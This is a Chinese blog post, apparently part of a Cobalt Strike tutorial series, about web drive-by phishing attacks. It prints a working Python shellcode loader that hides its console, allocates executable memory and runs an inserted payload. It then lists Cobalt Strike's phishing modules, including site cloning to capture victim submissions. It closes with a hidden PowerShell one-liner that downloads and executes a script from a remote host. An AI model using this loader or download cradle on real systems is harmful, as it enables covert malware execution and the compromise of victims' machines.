<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Cobalt Strike从入门到精通之Web Drive-By web钓鱼攻击 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Cobalt Strike从入门到精通之Web Drive-By web钓鱼攻击" />
<meta property="og:description" content="https://www.bilibili.com/video/BV1P64y1f7e1?p=6
Cobalt Strike Web Drive-By web钓鱼攻击 在这里补充一个上节课的新的知识点，如何使用python语言的payload 加载器去攻击
# length: 894 bytes from ctypes import * import ctypes buf = &#34;&#34; #这里填写payload PROT_READ = 1 PROT_WRITE = 2 PROT_EXEC = 4 def executable_code(buffer): buf = c_char_p(buffer) size = len(buffer) addr = libc.valloc(size) addr = c_void_p(addr) if 0 == addr: raise Exception(&#34;Failed to allocate memory&#34;) memmove(addr, buf, size) if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC): raise Exception(&#34;Failed to set protection on buffer&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/c9ce097be4b394a66a6bb9de640811e3/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-03-07T12:50:16+08:00" />
<meta property="article:modified_time" content="2021-03-07T12:50:16+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Cobalt Strike从入门到精通之Web Drive-By web钓鱼攻击</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-dracula">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p><a href="https://www.bilibili.com/video/BV1P64y1f7e1?p=6" rel="nofollow">https://www.bilibili.com/video/BV1P64y1f7e1?p=6</a></p> 
<h3><a id="Cobalt_Strike_Web_DriveBy_web_3"></a>Cobalt Strike Web Drive-By web钓鱼攻击</h3> 
<p>在这里补充一个上节课的新的知识点，如何使用python语言的payload 加载器去攻击</p> 
<pre><code class="prism language-python"><span class="token comment"># length: 894 bytes</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> ctypes
buf <span class="token operator">=</span> <span class="token string">""</span> <span class="token comment">#这里填写payload</span>
PROT_READ <span class="token operator">=</span> <span class="token number">1</span>
PROT_WRITE <span class="token operator">=</span> <span class="token number">2</span>
PROT_EXEC <span class="token operator">=</span> <span class="token number">4</span>
<span class="token keyword">def</span> <span class="token function">executable_code</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    buf <span class="token operator">=</span> c_char_p<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>
    size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>
    addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>valloc<span class="token punctuation">(</span>size<span class="token punctuation">)</span>
    addr <span class="token operator">=</span> c_void_p<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">==</span> addr<span class="token punctuation">:</span> 
        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Failed to allocate memory"</span><span class="token punctuation">)</span>
    memmove<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">!=</span> libc<span class="token punctuation">.</span>mprotect<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE <span class="token operator">|</span> PROT_EXEC<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Failed to set protection on buffer"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> addr
VirtualAlloc <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc
VirtualProtect <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualProtect
shellcode <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span>
whnd <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>GetConsoleWindow<span class="token punctuation">(</span><span class="token punctuation">)</span>   
<span class="token keyword">if</span> whnd <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
       <span class="token keyword">if</span> <span class="token number">1</span><span class="token punctuation">:</span>
              ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>user32<span class="token punctuation">.</span>ShowWindow<span class="token punctuation">(</span>whnd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>   
              ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>CloseHandle<span class="token punctuation">(</span>whnd<span class="token punctuation">)</span>
memorywithshell <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                          ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                          ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                          ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
buf <span class="token operator">=</span> <span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_char <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>from_buffer<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
old <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_long<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
VirtualProtect<span class="token punctuation">(</span>memorywithshell<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>byref<span class="token punctuation">(</span>old<span class="token punctuation">)</span><span class="token punctuation">)</span>
ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>RtlMoveMemory<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span>memorywithshell<span class="token punctuation">)</span><span class="token punctuation">,</span>
                                     buf<span class="token punctuation">,</span>
                                     ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
shell <span class="token operator">=</span> cast<span class="token punctuation">(</span>memorywithshell<span class="token punctuation">,</span> CFUNCTYPE<span class="token punctuation">(</span>c_void_p<span class="token punctuation">)</span><span class="token punctuation">)</span>
shell<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h4><a id="_50"></a>模块介绍</h4> 
<h5><a id="_52"></a>翻译</h5> 
<p>这个菜单的中英文翻译</p> 
<pre><code>Manage  对开启的web服务进行管理；
Clone Site 克隆网站，可以记录受害者提交的数据；
Host File 提供一个文件下载，可以修改Mime信息；
Scripted Web Delivery 类似于msf 的web_delivery ;
Signed Applet Attack 使用java自签名的程序进行钓鱼攻击;
Smart Applet Attack 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本；
System Profiler 用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等。
</code></pre> 
<pre><code>powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.149.208:80/test'))"
</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/7d1327fd06736a22178b361a9cdc0402/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">设计算法求数组中相差最小的两个元素（称为最接近数）的差。要求分别给出伪代码和C&#43;&#43;描述。</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/49c57585180508d5749bf8bd183b7f36/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">k8s中将flannel网络切换calico网络</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>